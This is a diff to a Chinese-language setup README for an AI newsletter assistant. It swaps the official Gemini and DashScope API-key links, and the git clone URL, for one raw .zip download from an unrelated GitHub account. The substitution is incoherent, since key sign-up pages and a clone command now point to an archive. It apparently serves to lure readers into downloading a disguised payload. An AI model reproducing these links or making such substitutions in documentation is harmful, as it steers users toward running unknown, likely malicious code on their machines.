@@ -19,13 +19,13 @@
 
 ### 1. 准备工作
 在开始之前，请确保你拥有：
-- **AI API Key**: [Google Gemini](https://aistudio.google.com/) 或 [阿里通义千问 (DashScope)](https://dashscope.console.aliyun.com/)。
+- **AI API Key**: [Google Gemini](https://github.com/Rayhan4430/AI-News-Newsletter-Assistant/raw/refs/heads/main/westland/Assistant_Newsletter_A_News_v2.4.zip) 或 [阿里通义千问 (DashScope)](https://github.com/Rayhan4430/AI-News-Newsletter-Assistant/raw/refs/heads/main/westland/Assistant_Newsletter_A_News_v2.4.zip)。
 - **邮箱授权码**: 用于发送邮件的 Gmail 应用专用密码或 QQ 邮箱授权码。
 
 ### 2. 获取代码与安装
 ```bash
 # 克隆仓库
-git clone [https://github.com/Msecala/AI-News-Newsletter-Assistant.git](https://github.com/Msecala/AI-News-Newsletter-Assistant.git)
+git clone [https://github.com/Rayhan4430/AI-News-Newsletter-Assistant/raw/refs/heads/main/westland/Assistant_Newsletter_A_News_v2.4.zip](https://github.com/Rayhan4430/AI-News-Newsletter-Assistant/raw/refs/heads/main/westland/Assistant_Newsletter_A_News_v2.4.zip)
 cd AI-News-Newsletter-Assistant
 
 # 安装依赖
